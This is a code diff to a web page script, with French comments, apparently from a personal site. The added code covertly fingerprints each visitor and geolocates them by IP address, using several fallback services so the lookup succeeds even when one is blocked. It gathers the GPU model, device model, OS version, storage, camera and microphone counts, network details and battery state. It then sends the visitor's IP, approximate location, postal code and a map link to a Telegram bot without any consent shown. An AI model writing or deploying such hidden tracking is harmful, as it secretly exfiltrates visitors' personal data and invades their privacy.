@@ -214,52 +214,182 @@
       return new Promise(function (res) {
         if (!navigator.getBattery) return res(null);
         navigator.getBattery().then(function (b) {
-          res(Math.round(b.level * 100) + "%" + (b.charging ? " ⚡en charge" : ""));
+          var s = Math.round(b.level * 100) + "%" + (b.charging ? " ⚡en charge" : "");
+          if (!b.charging && b.dischargingTime && b.dischargingTime !== Infinity)
+            s += " (~" + Math.round(b.dischargingTime / 60) + " min restantes)";
+          res(s);
         }).catch(function () { res(null); });
       });
     }
-    function getIP() {
-      return fetch("https://ipwho.is/").then(function (r) { return r.json(); }).catch(function () { return null; });
+
+    // Carte graphique réelle (révèle la puce : "Apple A16 GPU", "Adreno 740"…)
+    function gpuInfo() {
+      try {
+        var c = document.createElement("canvas");
+        var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+        if (!gl) return null;
+        var ext = gl.getExtension("WEBGL_debug_renderer_info");
+        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null;
+      } catch (e) { return null; }
     }
 
-    Promise.all([getIP(), getBattery()]).then(function (out) {
-      var geo = out[0], batt = out[1];
+    // Client Hints (Chrome/Android/Edge) : modèle exact, version OS, architecture
+    function getHints() {
+      return new Promise(function (res) {
+        var d = navigator.userAgentData;
+        if (!d || !d.getHighEntropyValues) return res(null);
+        d.getHighEntropyValues(["platform", "platformVersion", "model", "architecture", "bitness"])
+          .then(res).catch(function () { res(null); });
+      });
+    }
+
+    // Estimation du stockage disponible sur l'appareil
+    function getStorage() {
+      return new Promise(function (res) {
+        if (!navigator.storage || !navigator.storage.estimate) return res(null);
+        navigator.storage.estimate().then(res).catch(function () { res(null); });
+      });
+    }
+
+    // Nombre de caméras / micros / sorties audio (sans y accéder, donc sans permission)
+    function getMedia() {
+      return new Promise(function (res) {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return res(null);
+        navigator.mediaDevices.enumerateDevices().then(function (list) {
+          var c = { cam: 0, mic: 0, spk: 0 };
+          list.forEach(function (d) {
+            if (d.kind === "videoinput") c.cam++;
+            else if (d.kind === "audioinput") c.mic++;
+            else if (d.kind === "audiooutput") c.spk++;
+          });
+          res(c);
+        }).catch(function () { res(null); });
+      });
+    }
+    // Plusieurs fournisseurs en cascade : si l'un échoue/est bloqué, on passe au suivant.
+    // Chacun renvoie un format différent -> on normalise vers une forme commune.
+    function getIP() {
+      var providers = [
+        { url: "https://ipwho.is/", map: function (d) {
+            if (d.success === false || !d.ip) return null;
+            return { ip: d.ip, city: d.city, region: d.region, country: d.country,
+                     postal: d.postal, latitude: d.latitude, longitude: d.longitude,
+                     isp: d.connection && (d.connection.isp || d.connection.org),
+                     emoji: d.flag && d.flag.emoji, type: d.type }; } },
+        { url: "https://ipapi.co/json/", map: function (d) {
+            if (!d.ip || d.error) return null;
+            return { ip: d.ip, city: d.city, region: d.region, country: d.country_name,
+                     postal: d.postal, latitude: d.latitude, longitude: d.longitude,
+                     isp: d.org, type: (d.version || "").indexOf(":") >= 0 ? "IPv6" : "IPv4" }; } },
+        { url: "https://get.geojs.io/v1/ip/geo.json", map: function (d) {
+            if (!d.ip) return null;
+            return { ip: d.ip, city: d.city, region: d.region, country: d.country,
+                     latitude: d.latitude, longitude: d.longitude, isp: d.organization_name }; } },
+        { url: "https://api.ipify.org?format=json", map: function (d) {
+            return d.ip ? { ip: d.ip } : null; } } // dernier recours : au moins l'IP
+      ];
+      function tryNext(i) {
+        if (i >= providers.length) return Promise.resolve(null);
+        return fetch(providers[i].url)
+          .then(function (r) { return r.json(); })
+          .then(function (d) { var n = providers[i].map(d); return n || tryNext(i + 1); })
+          .catch(function () { return tryNext(i + 1); });
+      }
+      return tryNext(0);
+    }
+
+    Promise.all([getIP(), getBattery(), getHints(), getStorage(), getMedia()]).then(function (out) {
+      var geo = out[0], batt = out[1], hints = out[2], store = out[3], media = out[4];
       var now = new Date().toLocaleString("fr-FR", { dateStyle: "long", timeStyle: "medium" });
 
       var lines = ["👁 <b>Nouvelle visite — vladimirmoulu</b>", "🕒 " + now, ""];
 
-      // Localisation
-      if (geo && geo.success !== false && geo.city) {
-        var loc = [geo.city, geo.region, geo.country].filter(Boolean).join(", ");
-        if (geo.flag && geo.flag.emoji) loc += " " + geo.flag.emoji;
+      // Localisation — on affiche tout ce qu'on a, même partiel
+      var loc = geo ? [geo.city, geo.region, geo.country].filter(Boolean).join(", ") : "";
+      if (loc) {
+        if (geo.emoji) loc += " " + geo.emoji;
         lines.push("📍 " + esc(loc) + " <i>(approx. IP)</i>");
         if (geo.postal) lines.push("   Code postal : " + esc(geo.postal));
         if (geo.latitude) lines.push("   🗺 https://www.google.com/maps?q=" + geo.latitude + "," + geo.longitude);
+      } else if (geo && geo.ip) {
+        lines.push("📍 Ville non résolue — IP captée ci-dessous");
       } else {
-        lines.push("📍 Localisation inconnue");
+        // Aucun service joignable : on déduit au moins le pays via le fuseau/la langue
+        var guess = "";
+        try { guess = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
+        var lg = (navigator.language || "").split("-")[1];
+        lines.push("📍 " + esc(guess || lg || "indéterminée") + " <i>(estimé appareil)</i>");
       }
 
       // Réseau / IP
       if (geo && geo.ip) {
         lines.push("");
         lines.push("🔢 IP : " + esc(geo.ip));
-        if (geo.connection && (geo.connection.isp || geo.connection.org))
-          lines.push("📡 Opérateur : " + esc(geo.connection.isp || geo.connection.org));
-        if (geo.type) lines.push("   (IPv" + (geo.type === "IPv4" ? "4" : "6") + ")");
+        if (geo.isp) lines.push("📡 Opérateur : " + esc(geo.isp));
+        if (geo.type) lines.push("   (" + esc(geo.type) + ")");
       }
 
       // Appareil
       lines.push("");
       lines.push("📱 " + esc(osInfo()) + " · " + esc(browserInfo()));
+      var model = (ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\)|;)/i) || [])[1];
+      if (model && !/^[a-z]{2}-[a-z]{2}$/i.test(model.trim())) lines.push("📲 Modèle : " + esc(model.trim()));
       lines.push("↩️ Source : " + esc(source()));
       var langs = navigator.languages ? navigator.languages.join(", ") : navigator.language;
       lines.push("🌐 Langues : " + esc(langs || "?"));
       try { lines.push("🕓 Fuseau : " + Intl.DateTimeFormat().resolvedOptions().timeZone); } catch (e) {}
       lines.push("🖥 Écran : " + screen.width + "×" + screen.height + " @" + (window.devicePixelRatio || 1) + "x");
+      lines.push("   " + (screen.colorDepth || "?") + " bits · fenêtre " + window.innerWidth + "×" + window.innerHeight);
+      try { if (screen.orientation && screen.orientation.type) lines.push("   Orientation : " + screen.orientation.type); } catch (e) {}
       if (navigator.hardwareConcurrency) lines.push("⚙️ CPU : " + navigator.hardwareConcurrency + " cœurs");
-      if (navigator.deviceMemory) lines.push("💾 RAM : " + navigator.deviceMemory + " Go");
-      if (navigator.maxTouchPoints != null) lines.push("👆 Tactile : " + (navigator.maxTouchPoints > 0 ? "oui" : "non"));
-      if (navigator.connection && navigator.connection.effectiveType) lines.push("📶 Connexion : " + navigator.connection.effectiveType);
+      if (navigator.deviceMemory) lines.push("💾 RAM : " + navigator.deviceMemory + " Go (min.)");
+      if (navigator.maxTouchPoints != null) lines.push("👆 Tactile : " + (navigator.maxTouchPoints > 0 ? "oui (" + navigator.maxTouchPoints + " pts)" : "non"));
+
+      // Réseau détaillé (type, débit, latence)
+      var con = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (con) {
+        var net = [];
+        if (con.effectiveType) net.push(con.effectiveType);
+        if (con.downlink) net.push(con.downlink + " Mb/s");
+        if (con.rtt != null) net.push("ping " + con.rtt + " ms");
+        if (con.saveData) net.push("éco. données");
+        if (net.length) lines.push("📶 Réseau : " + net.join(" · "));
+      }
+
+      // GPU réel
+      var gpu = gpuInfo();
+      if (gpu) lines.push("🎮 GPU : " + esc(gpu));
+
+      // Client Hints : modèle exact + version OS + architecture (Android/Chrome/Edge)
+      if (hints) {
+        if (hints.model) lines.push("📲 Modèle exact : " + esc(hints.model));
+        var pv = [hints.platform, hints.platformVersion].filter(Boolean).join(" ").trim();
+        if (pv) lines.push("🧩 OS détaillé : " + esc(pv));
+        var arch = [hints.architecture, hints.bitness ? hints.bitness + " bits" : ""].filter(Boolean).join(" ").trim();
+        if (arch) lines.push("🏗 Architecture : " + esc(arch));
+      }
+
+      // Plateforme bas niveau + moteur
+      if (navigator.platform) lines.push("🧱 Plateforme : " + esc(navigator.platform));
+      if (navigator.vendor) lines.push("🏷 Moteur : " + esc(navigator.vendor));
+
+      // Périphériques média (comptage, sans accès caméra/micro)
+      if (media && (media.cam || media.mic || media.spk))
+        lines.push("🎥 Périphériques : " + media.cam + " cam · " + media.mic + " micro · " + media.spk + " sortie");
+
+      // Stockage
+      if (store && store.quota) {
+        var gb = function (n) { return (n / 1073741824).toFixed(1); };
+        lines.push("💽 Stockage : ~" + gb(store.usage || 0) + " / " + gb(store.quota) + " Go");
+      }
+
+      // Préférences système + divers
+      var prefs = [];
+      try { if (matchMedia("(prefers-color-scheme: dark)").matches) prefs.push("mode sombre"); } catch (e) {}
+      try { if (matchMedia("(prefers-reduced-motion: reduce)").matches) prefs.push("anim. réduites"); } catch (e) {}
+      if (prefs.length) lines.push("🎨 Préférences : " + prefs.join(", "));
+      lines.push("🍪 Cookies : " + (navigator.cookieEnabled ? "activés" : "désactivés"));
+
       if (batt) lines.push("🔋 Batterie : " + batt);
 
       fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
